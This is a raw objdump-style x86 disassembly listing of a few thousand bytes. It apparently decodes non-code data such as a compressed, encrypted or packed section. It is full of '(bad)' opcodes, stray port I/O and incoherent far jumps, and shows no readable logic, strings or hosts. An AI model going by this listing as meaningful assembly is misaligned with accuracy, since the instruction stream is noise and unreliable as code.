  4260ac:	mov    ecx,DWORD PTR [ecx+0x1c]
  4260af:	aad    0x27
  4260b1:	pop    eax
  4260b2:	push   cs
  4260b3:	jns    0x4260df
  4260b5:	retf   
  4260b6:	pop    ebx
  4260b7:	pop    ebp
  4260b8:	mov    ebx,0xd065eefb
  4260bd:	lahf   
  4260be:	(bad)  
  4260bf:	adc    eax,0xaffd340b
  4260c4:	inc    edi
  4260c5:	js     0x4260e5
  4260c7:	push   0xffffffd3
  4260c9:	add    BYTE PTR [edi],ah
  4260cb:	pop    edx
  4260cc:	sbb    BYTE PTR [edx+eax*2],dl
  4260cf:	lock add eax,0x82d83c50
  4260d5:	xchg   DWORD PTR [ebx],edx
  4260d7:	pop    ss
  4260d8:	test   BYTE PTR [eax+0x3e],0x81
  4260dc:	popf   
  4260dd:	(bad)  
  4260de:	lock cmp bl,bl
  4260e1:	adc    cl,BYTE PTR [eax-0x71]
  4260e4:	push   ecx
  4260e5:	mov    bh,0x31
  4260e7:	sub    dh,BYTE PTR [esi+ebx*2]
  4260ea:	ret    0x120b
  4260ed:	out    dx,al
  4260ee:	xlat   BYTE PTR ds:[ebx]
  4260ef:	push   esp
  4260f0:	pop    esp
  4260f2:	adc    dl,dl
  4260f4:	jg     0x4260d2
  4260f6:	push   cs
  4260f7:	jl     0x4260a7
  4260f9:	cli    
  4260fa:	jp     0x4260cf
  4260fc:	das    
  4260fd:	cmp    edx,DWORD PTR [ebp-0x2a5f5dc]
  426103:	sbb    bl,BYTE PTR [ebp+ecx*8+0x2d322f56]
  42610a:	cvtdq2ps xmm0,XMMWORD PTR ds:0x84486f96
  426111:	sub    BYTE PTR [esi+edx*4+0x29],dh
  426115:	and    DWORD PTR [eax-0x6a705fe8],eax
  42611b:	cmp    DWORD PTR ds:0x76eb062d,ebx
  426121:	ds mov eax,0x830dfc74
  426127:	add    esp,DWORD PTR [ebx-0x6129aa05]
  42612d:	inc    ebp
  42612e:	cwde   
  42612f:	sub    bl,ah
  426131:	les    ecx,FWORD PTR cs:[ecx]
  426134:	jmp    0xb16e:0x2dfdc23
  42613b:	sub    DWORD PTR [edx-0x41bfbb61],ebx
  426141:	stos   BYTE PTR es:[edi],al
  426142:	outs   dx,DWORD PTR ds:[esi]
  426143:	jb     0x4261b8
  426145:	lea    edi,[edi]
  426147:	test   ebx,ebx
  426149:	loope  0x4261a1
  42614b:	add    al,0x68
  42614d:	mov    ecx,0xe7998761
  426152:	outs   dx,BYTE PTR ds:[esi]
  426153:	xor    esi,DWORD PTR [edx]
  426155:	mov    gs,WORD PTR [ecx-0x7]
  426158:	inc    esp
  426159:	sub    BYTE PTR [esi-0x372b6c1a],bh
  42615f:	mov    dl,0x5f
  426161:	ja     0x4261b2
  426163:	sti    
  426164:	xchg   esp,eax
  426165:	mov    ah,0x48
  426167:	cmc    
  426168:	xor    al,0xa3
  42616a:	mov    dh,0x28
  42616c:	add    esp,DWORD PTR [ebp+0x6a]
  42616f:	aaa    
  426170:	xchg   ebx,eax
  426171:	mov    BYTE PTR [eax+0x22750680],bl
  426177:	shr    BYTE PTR [ecx+edi*1-0x710092cf],0x2a
  42617f:	jno    0x42619c
  426181:	or     al,0x1c
  426183:	mov    ah,0x6
  426185:	popa   
  426186:	mov    dl,0x84
  426188:	adc    ebp,ecx
  42618a:	arpl   WORD PTR [edi],di
  42618c:	sbb    bl,ch
  42618e:	dec    ebp
  42618f:	les    edx,FWORD PTR [esp+eiz*4]
  426192:	daa    
  426193:	pop    ds
  426194:	xlat   BYTE PTR ds:[ebx]
  426195:	sub    DWORD PTR ds:[esp+esi*8-0x3b],0x84964594
  42619e:	aad    0x6e
  4261a0:	aad    0x9a
  4261a2:	adc    eax,0xa107ffcd
  4261a7:	mov    ch,0x41
  4261a9:	into   
  4261aa:	out    dx,al
  4261ab:	stc    
  4261ac:	fcom   DWORD PTR [eax-0x51]
  4261af:	ret    
  4261b0:	add    eax,0x7aeb2046
  4261b5:	(bad)  
  4261b6:	lahf   
  4261b7:	scas   al,BYTE PTR es:[edi]
  4261b8:	sbb    eax,0x4265bc08
  4261bd:	push   cs
  4261be:	mov    BYTE PTR [edx],bl
  4261c0:	cdq    
  4261c1:	xchg   ebx,eax
  4261c2:	push   ebx
  4261c3:	sub    eax,0xbc8882f2
  4261c8:	inc    BYTE PTR cs:[ebx*1-0x1337405f]
  4261d0:	mov    dh,0x33
  4261d2:	pop    ds
  4261d3:	out    dx,eax
  4261d4:	xchg   edx,eax
  4261d5:	popf   
  4261d6:	pop    ss
  4261d7:	mov    eax,0x7c4935fb
  4261dc:	in     eax,dx
  4261dd:	out    dx,eax
  4261de:	(bad)  
  4261df:	ds aam 0xe2
  4261e2:	mov    esp,0x249d6364
  4261e7:	pop    edi
  4261e8:	adc    esp,DWORD PTR [ebx+0x14934ed0]
  4261ee:	jae    0x4261fc
  4261f0:	cld    
  4261f1:	jg     0x426265
  4261f3:	repz mov al,0xa4
  4261f6:	inc    eax
  4261f7:	jo     0x426188
  4261f9:	add    al,0xa9
  4261fb:	dec    ebx
  4261fc:	or     al,BYTE PTR [edx+0x1ef2c6f1]
  426202:	test   al,0x61
  426204:	jnp    0x426243
  426206:	sub    al,0x49
  426208:	xor    DWORD PTR [edx-0x58],esp
  42620b:	ror    BYTE PTR [ecx+edi*4],1
  42620e:	mov    cl,0x7f
  426210:	jb     0x290a34b1
  426216:	loope  0x4261c3
  426218:	cmp    eax,0x114d5721
  42621d:	out    0x1c,eax
  42621f:	lock outs dx,BYTE PTR ds:[esi]
  426221:	shl    BYTE PTR [ebx],0x77
  426224:	cwde   
  426225:	adc    BYTE PTR [edx-0x56],dl
  426228:	fld    DWORD PTR [edi]
  42622a:	ret    0x4111
  42622d:	loopne 0x4261d3
  42622f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426230:	sahf   
  426231:	stos   BYTE PTR es:[edi],al
  426232:	std    
  426233:	leave  
  426234:	aas    
  426235:	popf   
  426236:	jmp    0x7c26:0xb6e4251f
  42623d:	popa   
  42623e:	jo     0x426219
  426240:	xchg   ebp,eax
  426241:	jae    0x4262a9
  426243:	push   edi
  426244:	jbe    0x426259
  426246:	xor    BYTE PTR [edx+0x3d],bh
  426249:	out    dx,eax
  42624a:	dec    ebx
  42624b:	mov    al,ds:0xe471a380
  426250:	jmp    0xd116:0x45e1e979
  426257:	mov    sp,0x7aae
  42625b:	js     0x42628e
  42625d:	retf   0x4d88
  426260:	push   0x49
  426262:	popf   
  426263:	pop    ss
  426264:	in     eax,0x6e
  426266:	std    
  426267:	sbb    bh,BYTE PTR [eax-0x3c]
  42626a:	inc    eax
  42626b:	xchg   DWORD PTR [ecx-0x42b2d4c0],edi
  426271:	daa    
  426272:	inc    cl
  426274:	call   FWORD PTR [esp+ebx*1]
  426277:	mov    esi,0xdae609d
  42627c:	fs jbe 0x4262e4
  42627f:	aam    0x3c
  426281:	mov    ah,0xfb
  426283:	or     al,bl
  426285:	(bad)  
  426286:	adc    BYTE PTR [ebp-0x4f315ac2],al
  42628c:	adc    DWORD PTR [esi+0x30],eax
  42628f:	xor    ecx,DWORD PTR [edi]
  426291:	ss daa 
  426293:	inc    edi
  426294:	repnz mov ecx,0x6299811c
  42629a:	fwait
  42629b:	jno    0x4262f3
  42629d:	push   ds
  42629e:	in     eax,0x41
  4262a0:	cmp    ch,BYTE PTR [eax+edi*4]
  4262a3:	ins    DWORD PTR es:[edi],dx
  4262a4:	clc    
  4262a5:	pop    ss
  4262a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262a7:	lahf   
  4262a8:	push   ds
  4262a9:	daa    
  4262aa:	fld    QWORD PTR [edi*2+0x2b5ab948]
  4262b1:	jmp    0x133:0xd9fefd34
  4262b8:	xchg   esp,eax
  4262b9:	test   DWORD PTR [ebx],esp
  4262bb:	mov    esp,0xe9d2539e
  4262c0:	shl    DWORD PTR ds:0x328be2b7,cl
  4262c6:	cmp    BYTE PTR [esi-0x28],0x22
  4262ca:	pop    edx
  4262cb:	push   cs
  4262cc:	push   es
  4262cd:	test   DWORD PTR [esi+0x46],ebx
  4262d0:	xor    DWORD PTR [eax-0x8978467],ebx
  4262d6:	out    dx,eax
  4262d7:	push   ds
  4262d8:	pop    edi
  4262d9:	fcomp  st(0)
  4262db:	pushf  
  4262dc:	pushf  
  4262dd:	loope  0x4262c7
  4262df:	(bad)  
  4262e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262e1:	test   DWORD PTR [eax],edi
  4262e3:	mov    ebx,0x64ed558c
  4262e8:	push   ss
  4262e9:	(bad)  
  4262ea:	jae    0x4262a1
  4262ec:	or     DWORD PTR [esi-0x667951c0],esi
  4262f2:	fbld   TBYTE PTR gs:[ebx-0x1d]
  4262f6:	jmp    0xcbc6:0xbd663e1b
  4262fd:	and    al,0xb0
  4262ff:	bswap  ecx
  426301:	adc    DWORD PTR [ecx],eax
  426303:	(bad)  
  426304:	in     al,dx
  426305:	pop    esi
  426306:	test   al,0x98
  426308:	mov    ebx,0x96cc2896
  42630d:	xlat   BYTE PTR ds:[ebx]
  42630e:	sub    eax,0x6cc53b2d
  426313:	pop    es
  426314:	repnz sub BYTE PTR [ebp+0x1f],bl
  426318:	adc    bl,ch
  42631a:	test   BYTE PTR [ebp-0x4c5a00fb],cl
  426320:	push   esp
  426321:	pushf  
  426322:	push   esi
  426323:	mov    ebp,0x4b2e9ef4
  426328:	pop    ebp
  426329:	push   0x24
  42632b:	inc    edi
  42632c:	sahf   
  42632d:	cmp    ebx,DWORD PTR [ebp-0x20]
  426330:	and    BYTE PTR [esi+0x79],ah
  426333:	les    ebp,FWORD PTR [edx-0x58]
  426336:	into   
  426337:	xchg   ebp,eax
  426338:	sub    eax,0xfc8649c2
  42633d:	push   edi
  42633e:	cmp    cl,BYTE PTR [esi]
  426340:	push   ds
  426341:	push   edx
  426342:	in     al,dx
  426343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426344:	push   edi
  426345:	dec    esi
  426346:	mov    edi,0x1e057eba
  42634b:	sub    ch,BYTE PTR [ebp-0x7c]
  42634e:	mov    eax,ds:0x22847e2f
  426353:	clc    
  426354:	jae    0x4263b6
  426356:	ror    dh,0x13
  426359:	xor    ebp,esp
  42635b:	xchg   DWORD PTR [edi+0x7a],edx
  42635e:	fsub   DWORD PTR [esi+0x465cd60]
  426364:	ins    DWORD PTR es:[edi],dx
  426365:	aam    0xcd
  426367:	pop    edx
  426368:	addr16 xor eax,0xf43be09d
  42636e:	je     0x4263e5
  426370:	pop    edi
  426371:	clc    
  426372:	jbe    0x426372
  426374:	and    esp,DWORD PTR [esi-0x7f]
  426377:	imul   ebp,DWORD PTR [esi+0x7a9e1f9f],0xce7e2a78
  426381:	ds push cs
  426383:	fs ins DWORD PTR es:[edi],dx
  426385:	imul   edi,DWORD PTR [eax],0x37a063a2
  42638b:	push   0xb5bd2593
  426390:	xchg   BYTE PTR [ecx],al
  426392:	cmp    DWORD PTR [edx-0x6b],ebp
  426395:	mov    edx,0x40c83694
  42639a:	push   ebx
  42639b:	outs   dx,DWORD PTR ds:[esi]
  42639c:	push   esp
  42639d:	mov    ds:0xdc3239bf,al
  4263a2:	mov    al,ds:0xbd8bd34f
  4263a7:	and    bl,bl
  4263a9:	mov    edx,0xa2bba47c
  4263ae:	jge    0x4263ef
  4263b0:	jecxz  0x42638c
  4263b2:	sub    BYTE PTR ds:0xd87dc68d,cl
  4263b8:	jle    0x4263ac
  4263ba:	cmp    al,0xa1
  4263bc:	push   esi
  4263bd:	dec    esp
  4263be:	rol    BYTE PTR [ecx+0x27a1f9a8],1
  4263c4:	jmp    0xbb382612
  4263c9:	inc    edi
  4263ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263cb:	idiv   BYTE PTR [eax+0x476d825f]
  4263d1:	leave  
  4263d2:	inc    ebp
  4263d3:	sbb    bl,BYTE PTR [edx-0x7609aa2b]
  4263d9:	scas   eax,DWORD PTR es:[edi]
  4263da:	lods   eax,DWORD PTR ds:[si]
  4263dc:	sub    al,0x36
  4263de:	div    ecx
  4263e0:	call   DWORD PTR [edx]
  4263e2:	add    al,0xe
  4263e4:	add    DWORD PTR [edi-0x19],esi
  4263e7:	lods   eax,DWORD PTR ds:[esi]
  4263e8:	jmp    0x426370
  4263ea:	loope  0x42642d
  4263ec:	rol    DWORD PTR [ecx+0x33],cl
  4263ef:	jno    0x42644a
  4263f1:	jae    0x42640a
  4263f3:	cmp    al,0x43
  4263f5:	add    ecx,DWORD PTR [eax+esi*4-0x19]
  4263f9:	sub    cl,BYTE PTR [ebp-0x8605f7e]
  4263ff:	leave  
  426400:	lods   al,BYTE PTR ds:[esi]
  426401:	add    dl,BYTE PTR [ebp-0xcb3d5f2]
  426407:	fist   DWORD PTR [esi+0x476338e0]
  42640d:	sahf   
  42640e:	lahf   
  42640f:	(bad)  
  426410:	pop    esp
  426411:	fwait
  426412:	mov    bh,dl
  426414:	jmp    0x10fa:0xfdc3465a
  42641b:	daa    
  42641c:	hlt    
  42641d:	fisttp QWORD PTR [ebx-0x27]
  426420:	mov    ebx,0x948421c
  426425:	inc    esp
  426426:	pop    ds
  426427:	loopne 0x42642f
  426429:	sub    DWORD PTR [ecx-0xde34c8b],0x19
  426430:	mov    WORD PTR [ecx+0x7925b367],ds
  426436:	push   ss
  426437:	in     eax,dx
  426438:	xor    bl,BYTE PTR [esp+eax*4+0x39]
  42643c:	add    al,0xf6
  42643e:	adc    al,BYTE PTR [edi-0x80]
  426441:	add    bl,BYTE PTR [edi]
  426443:	jge    0x426407
  426445:	cmp    esi,DWORD PTR [ebx+0x628a8fe6]
  42644b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42644c:	cwde   
  42644d:	inc    edx
  42644e:	aaa    
  42644f:	loopne 0x4264b6
  426451:	cmp    ebp,DWORD PTR [edi-0x729fc3fb]
  426457:	adc    dl,BYTE PTR [esi-0x7d]
  42645a:	repz sar BYTE PTR [eax-0x1681767a],0x27
  426462:	pop    ecx
  426463:	mov    BYTE PTR [edi-0x63],0x1f
  426467:	sub    BYTE PTR [edi],bh
  426469:	cwde   
  42646a:	jb     0x4264cd
  42646c:	call   0x273d6192
  426471:	js     0x42649d
  426473:	add    eax,DWORD PTR [ecx]
  426475:	jns    0x42646f
  426477:	push   ecx
  426478:	sbb    DWORD PTR [edi+esi*1-0x74],esp
  42647c:	out    0x5f,eax
  42647e:	adc    al,0xa5
  426480:	loope  0x4264c3
  426482:	inc    edi
  426483:	dec    ecx
  426484:	fdivr  DWORD PTR [eax+0x45eefc43]
  42648a:	push   ebx
  42648b:	loopne 0x42642b
  42648d:	mov    ebp,0xf603bcd8
  426492:	adc    dl,0x6a
  426495:	mov    ds:0x3b,al
	...
  426512:	add    BYTE PTR [eax],al
  426514:	mov    edi,0xed95a576
  426519:	xlat   BYTE PTR ds:[ebx]
  42651a:	mov    edi,0xa0a36c7e
  42651f:	sar    BYTE PTR [ebp-0x442d8455],0xf6
  426526:	add    DWORD PTR [eax],eax
  426528:	imul   eax,DWORD PTR [edi],0x0
  42652b:	add    BYTE PTR [ecx-0x3a386bab],dh
  426531:	xchg   esp,eax
  426532:	xchg   edx,eax
  426533:	push   esp
  426534:	push   edx
  426535:	and    ch,BYTE PTR [esi+edi*8]
  426538:	(bad)  
  42653a:	popf   
  42653b:	mov    bh,BYTE PTR [ebx-0x74c20939]
  426541:	lods   eax,DWORD PTR ds:[esi]
  426542:	mov    ds:0x4e1d4332,al
  426547:	shr    dh,1
  426549:	mov    bl,0xeb
  42654b:	repz hlt 
  42654d:	addr16 addr16 push esp
  426550:	je     0x426562
  426552:	fnstcw WORD PTR [eax+0x5d399d07]
  426558:	ror    BYTE PTR es:[ebp-0x77f223ad],0x85
  426560:	popf   
  426561:	pop    ebp
  426562:	xchg   edx,eax
  426563:	(bad)  
  426564:	jle    0x426547
  426566:	ret    
  426567:	jo     0x426578
  426569:	daa    
  42656a:	in     eax,0x32
  42656c:	fcmovnu st,st(2)
  42656e:	add    BYTE PTR [edi],ch
  426570:	push   ecx
  426571:	push   ebp
  426572:	xlat   BYTE PTR ds:[ebx]
  426573:	aas    
  426574:	jecxz  0x42658d
  426576:	inc    ecx
  426577:	rcr    DWORD PTR [eax-0xe433e35],1
  42657d:	pop    edx
  42657e:	jmp    0x4265c7
  426580:	retf   0xa9e3
  426583:	sub    al,0x3
  426585:	leave  
  426586:	loop   0x426560
  426588:	lock test BYTE PTR [edx+0x5b0ad967],ah
  42658f:	xchg   di,ax
  426591:	xchg   edx,eax
  426592:	jmp    0xdc0d:0x45e94570
  426599:	gs jae 0x426544
  42659c:	popa   
  42659d:	cmc    
  42659e:	inc    edi
  42659f:	xchg   esi,eax
  4265a0:	dec    bx
  4265a2:	rol    BYTE PTR [eax+0x6354ab87],0x80
  4265a9:	stc    
  4265aa:	push   ebx
  4265ab:	sub    eax,0x22b0072e
  4265b0:	retf   
  4265b1:	add    DWORD PTR [ecx-0x19332f7c],0x5b
  4265b8:	enter  0x9534,0xdf
  4265bc:	stos   DWORD PTR es:[edi],eax
  4265bd:	hlt    
  4265be:	(bad)  
  4265bf:	cmp    DWORD PTR [ebp-0x7],edi
  4265c2:	add    al,bl
  4265c4:	scas   al,BYTE PTR es:[edi]
  4265c5:	or     DWORD PTR [ebx-0x15c1116f],esi
  4265cb:	pop    es
  4265cc:	mov    bh,BYTE PTR [edx+0x3d6a7f4]
  4265d2:	jbe    0x4265ec
  4265d4:	xor    esi,DWORD PTR [ebp+0x73f0c6da]
  4265da:	shl    DWORD PTR [esi],0xed
  4265dd:	call   0x25bf:0x95828673
  4265e4:	hlt    
  4265e5:	std    
  4265e6:	in     al,dx
  4265e7:	scas   eax,DWORD PTR es:[edi]
  4265e8:	sbb    DWORD PTR [edi],edx
  4265ea:	js     0x426570
  4265ec:	sti    
  4265ed:	fidiv  DWORD PTR [eax]
  4265ef:	push   ecx
  4265f0:	cmp    DWORD PTR [ecx+0x71],ecx
  4265f3:	fistp  WORD PTR [ecx-0x58acb121]
  4265f9:	and    esi,DWORD PTR ds:0x2055404d
  4265ff:	in     al,dx
  426600:	aam    0x9d
  426602:	retf   0x1b22
  426605:	xchg   ecx,eax
  426606:	and    al,0xa3
  426608:	test   BYTE PTR [ebx],bl
  42660a:	mul    BYTE PTR [ebp-0x79]
  42660d:	int    0x66
  42660f:	or     ch,BYTE PTR [edi+0x47a5186d]
  426615:	outs   dx,BYTE PTR ds:[esi]
  426616:	aam    0x2f
  426618:	test   eax,0xcfabbb92
  42661d:	and    edx,ebx
  42661f:	cmc    
  426620:	fidiv  WORD PTR [eax]
  426622:	aas    
  426623:	jmp    0xeb4b:0xb2cd4eff
  42662a:	xor    BYTE PTR [ecx-0x24],cl
  42662d:	xchg   esp,eax
  42662e:	jno    0x4265f8
  426630:	jbe    0x426676
  426632:	mov    eax,ds:0x87cce8
  426637:	pop    ds
  426638:	cli    
  426639:	ja     0x426629
  42663b:	aaa    
  42663c:	sbb    dh,0xae
  42663f:	fdiv   DWORD PTR ds:0xe0e98d70
  426645:	adc    al,0x17
  426647:	mov    BYTE PTR [ecx],bh
  426649:	int3   
  42664a:	lds    ebp,FWORD PTR [ebx-0x7a]
  42664d:	sar    DWORD PTR [ebp-0x5a],1
  426650:	cdq    
  426651:	lock xor eax,0x91346455
  426657:	retf   
  426658:	ja     0x42664c
  42665a:	push   cs
  42665b:	test   edx,ebp
  42665d:	jp     0x4265e4
  42665f:	test   BYTE PTR [edx+0x5b00c57],al
  426665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426666:	rol    bl,cl
  426668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426669:	mov    DWORD PTR [edx-0x8],ecx
  42666c:	popf   
  42666d:	or     esp,DWORD PTR [ebx+0x6924176e]
  426673:	lock div BYTE PTR [eax-0x5ec8a426]
  42667a:	mov    WORD PTR [esi],?
  42667c:	pop    edx
  42667d:	sub    edi,eax
  42667f:	ret    0xadd0
  426682:	(bad)  
  426683:	push   edx
  426684:	cmp    al,0x69
  426686:	mov    esi,0xb312b99c
  42668b:	outs   dx,BYTE PTR ds:[esi]
  42668c:	js     0x42669b
  42668e:	lods   al,BYTE PTR ds:[esi]
  42668f:	mov    esp,0xcc04555c
  426694:	push   ds
  426695:	repnz xchg esi,eax
  426697:	dec    ebx
  426698:	pop    ecx
  426699:	and    al,0xa3
  42669b:	pop    es
  42669c:	je     0x4266a4
  42669e:	push   0x59
  4266a0:	ror    BYTE PTR [ebp+0x6c],1
  4266a3:	inc    eax
  4266a4:	call   0x2f19ea52
  4266a9:	inc    ebx
  4266aa:	sar    DWORD PTR [edx+0x5c229158],1
  4266b0:	xchg   ebx,eax
  4266b1:	dec    edi
  4266b2:	dec    ebx
  4266b3:	inc    ebp
  4266b4:	fcomp  DWORD PTR [edx]
  4266b6:	or     eax,0x692438df
  4266bb:	add    BYTE PTR [ebp+0x1a],ch
  4266be:	pop    ebx
  4266bf:	xchg   esi,eax
  4266c0:	ds (bad) 
  4266c2:	aad    0x33
  4266c4:	adc    al,0x91
  4266c6:	sub    eax,0xa49c5f92
  4266cb:	pop    esp
  4266cc:	xchg   DWORD PTR [edi+0x6a06b743],ebx
  4266d2:	cmc    
  4266d3:	or     ah,cl
  4266d5:	sbb    eax,0x4cd28ad4
  4266da:	int3   
  4266db:	mov    ch,0x7
  4266dd:	cmp    eax,0x93748b8d
  4266e2:	add    BYTE PTR [edx],ah
  4266e4:	ficomp DWORD PTR [esi-0x7ff5f575]
  4266ea:	sbb    al,al
  4266ec:	dec    ecx
  4266ed:	stc    
  4266ee:	arpl   WORD PTR [ecx-0x48],sp
  4266f1:	repnz loop 0x4266b9
  4266f4:	mov    al,ds:0x58aacb9c
  4266f9:	push   es
  4266fa:	lds    edx,FWORD PTR [ecx+0x28]
  4266fd:	and    ecx,ebp
  4266ff:	sub    DWORD PTR ds:0x3dfacb0b,edi
  426705:	ds sub eax,0xb9fb131e
  42670b:	enter  0x5359,0x2c
  42670f:	nop
  426710:	jne    0x426747
  426712:	jbe    0x4266b0
  426714:	test   al,0x6b
  426716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426717:	rcr    BYTE PTR [ecx],1
  426719:	add    BYTE PTR [ebp+0x2c],dl
  42671c:	jno    0x4266ea
  42671e:	mov    edi,0x17296645
  426723:	and    BYTE PTR [ecx-0x5f105994],0xb0
  42672a:	mov    ebp,0xf43067a3
  42672f:	into   
  426730:	cmp    esp,edi
  426732:	jmp    0x426757
  426734:	jno    0x426795
  426736:	mov    bl,0xd9
  426738:	add    eax,0xe09f2dd3
  42673d:	out    dx,al
  42673e:	in     al,dx
  42673f:	xchg   esi,eax
  426740:	mov    al,BYTE PTR [edi-0x19]
  426743:	(bad)  
  426744:	mov    ds:0x553781f5,al
  426749:	loope  0x4266f0
  42674b:	inc    ebp
  42674c:	lock outs dx,BYTE PTR ds:[esi]
  42674e:	shr    DWORD PTR ds:0x9257ba7c,1
  426754:	rol    esi,1
  426756:	jb     0x426737
  426758:	jae    0x42679e
  42675a:	push   ss
  42675b:	sbb    eax,0x2eb95942
  426760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426761:	dec    ecx
  426762:	jg     0x4267a2
  426764:	retw   
  426766:	sub    eax,DWORD PTR [ecx]
  426768:	cmc    
  426769:	out    dx,eax
  42676a:	xchg   esp,eax
  42676b:	pop    edi
  42676c:	rcl    BYTE PTR [ebx+0x1486287f],0xdc
  426773:	sbb    DWORD PTR [eax-0x3238dbf5],0x4113398c
  42677d:	shl    esi,1
  42677f:	shr    DWORD PTR [ebp+0x7b],cl
  426782:	cmp    eax,0xed98dd96
  426787:	pop    edi
  426788:	ret    0xac27
  42678b:	out    0xf6,al
  42678d:	sahf   
  42678e:	scas   al,BYTE PTR es:[edi]
  42678f:	jp     0x42672d
  426791:	mov    dh,0x46
  426793:	rcr    esp,0x26
  426796:	lock sub eax,0x9da5e524
  42679c:	stos   DWORD PTR es:[edi],eax
  42679d:	out    dx,al
  42679e:	in     al,dx
  42679f:	jnp    0x426815
  4267a1:	cmp    dh,cl
  4267a3:	sahf   
  4267a4:	cmp    dl,BYTE PTR [ecx-0x44]
  4267a7:	mov    ebx,0x468d7cf0
  4267ac:	mov    al,ds:0x8c5de0
  4267b1:	cli    
  4267b2:	scas   eax,DWORD PTR es:[edi]
  4267b3:	jns    0x426741
  4267b5:	mov    bh,0x49
  4267b7:	aas    
  4267b8:	jae    0x4267d2
  4267ba:	pop    ecx
  4267bb:	push   ebp
  4267bc:	dec    ecx
  4267bd:	aas    
  4267be:	test   DWORD PTR [ebp+0x6d],ecx
  4267c1:	cmp    eax,DWORD PTR [eax]
  4267c3:	mov    al,0x29
  4267c5:	and    al,0xe7
  4267c7:	and    ah,BYTE PTR [ebx-0x3c]
  4267ca:	xor    bl,ah
  4267cc:	mov    ecx,0xceef6f6b
  4267d1:	outs   dx,DWORD PTR ds:[esi]
  4267d2:	sbb    cl,BYTE PTR [ebx+edx*4-0x37]
  4267d6:	xor    eax,0x67b72e9c
  4267db:	mov    edx,0x1adefac
  4267e0:	(bad)  
  4267e1:	nop
  4267e2:	and    eax,eax
  4267e4:	ror    dh,0x8b
  4267e7:	enter  0x37a,0x8a
  4267eb:	cmp    al,0x13
  4267ed:	adc    edx,DWORD PTR [esp+ebp*2-0x27a47e3c]
  4267f4:	enter  0x5d6f,0x75
  4267f8:	fmulp  st(0),st
  4267fa:	ins    DWORD PTR es:[edi],dx
  4267fb:	scas   eax,DWORD PTR es:[edi]
  4267fc:	(bad)  
  4267fd:	jle    0x4267f7
  4267ff:	add    ebx,DWORD PTR [ecx-0x3b]
  426802:	pop    ebp
  426803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426804:	mov    dh,0xae
  426806:	dec    esi
  426807:	out    dx,al
  426808:	daa    
  426809:	xor    al,0xf3
  42680b:	and    eax,0xb1d2a837
  426810:	and    al,BYTE PTR [ebp-0x38]
  426813:	into   
  426814:	ja     0x42681e
  426816:	mov    bh,0x59
  426818:	xor    DWORD PTR [edx],0x49db52fd
  42681e:	dec    esi
  42681f:	pop    es
  426820:	int    0xb3
  426822:	sub    al,0x6
  426824:	dec    ecx
  426825:	push   edi
  426826:	dec    esp
  426827:	xchg   esi,eax
  426828:	push   ebx
  426829:	in     eax,dx
  42682a:	aaa    
  42682b:	add    eax,0x2e16c947
  426830:	push   esp
  426831:	addr16 inc edx
  426833:	mov    bh,0xba
  426835:	mov    al,ds:0x713d06c
  42683a:	mov    ch,0xe
  42683c:	cmp    cl,BYTE PTR [edi-0x56]
  42683f:	pop    esp
  426840:	ret    0xa4a4
  426843:	jp     0x426834
  426845:	fdivr  DWORD PTR [eax+edx*2+0x285fc453]
  42684c:	daa    
  42684d:	icebp  
  42684e:	fs jns 0x4268c4
  426851:	pop    ebx
  426852:	popa   
  426853:	pusha  
  426854:	nop
  426855:	sbb    al,0x58
  426857:	addr16 and esp,0xa925a566
  42685e:	pop    ebp
  42685f:	cld    
  426860:	cs or  al,0xfb
  426863:	or     edx,DWORD PTR [ebx]
  426865:	shl    DWORD PTR [esi+0x67e052b4],0x9b
  42686c:	sub    dh,dh
  42686e:	cmp    esi,DWORD PTR [edx]
  426870:	push   edx
  426871:	lods   eax,DWORD PTR ds:[si]
  426873:	jmp    0x47100927
  426878:	in     al,dx
  426879:	xchg   esi,eax
  42687a:	mov    al,ds:0x19aaed86
  42687f:	xchg   ebx,eax
  426880:	int    0x8e
  426882:	cmp    BYTE PTR [ebx-0xc73da1],0x2d
  426889:	mov    ch,0xa2
  42688b:	(bad)  
  42688c:	mov    dh,BYTE PTR [ebp+0x39]
  42688f:	jmp    0xf72f:0x9becbb73
  426896:	loope  0x42683e
  426898:	js     0x426839
  42689a:	pop    ss
  42689b:	cmc    
  42689c:	jl     0x42682f
  42689e:	pop    ds
  42689f:	or     al,0x60
  4268a1:	test   eax,0x1a0163c6
  4268a6:	jle    0x4268e3
  4268a8:	aad    0xe2
  4268aa:	inc    esi
  4268ab:	mov    eax,DWORD PTR es:[ecx+0x57cf62ec]
  4268b2:	push   ebp
  4268b3:	add    eax,0x601b2a26
  4268b8:	bound  ecx,QWORD PTR [ecx]
  4268ba:	mov    ch,0xbb
  4268bc:	xchg   DWORD PTR [ebx+ebp*8],edx
  4268bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268c0:	mov    edx,0xa04a4c13
  4268c5:	mov    eax,0x5fb58f02
  4268ca:	ror    DWORD PTR [ebx+ebx*1],0x62
  4268ce:	lods   eax,DWORD PTR ds:[si]
  4268d0:	xor    eax,0xec48b92c
  4268d5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4268d7:	out    0xa2,eax
  4268d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268da:	mov    dh,0xa3
  4268dc:	and    al,0xa3
  4268de:	das    
  4268df:	imul   esp,DWORD PTR [ebx+0x3e],0x2714ea6e
  4268e6:	cmp    al,0x9c
  4268e8:	sbb    DWORD PTR [ebx-0x51],ecx
  4268eb:	and    eax,0x7df05e09
  4268f0:	mov    WORD PTR [esi+0x77d47fe7],?
  4268f6:	jno    0x4268bf
  4268f8:	jnp    0x42687b
  4268fa:	cmp    DWORD PTR [eiz*8-0x39767d5d],0x4b413804
  426905:	or     DWORD PTR [edx],0xcceaf8ad
  42690b:	pushf  
  42690c:	fcmovu st,st(7)
  42690e:	ror    BYTE PTR [edx-0x70],0xa8
  426912:	loopne 0x42690e
  426914:	aad    0x35
  426916:	mov    eax,ds:0xb20ab12c
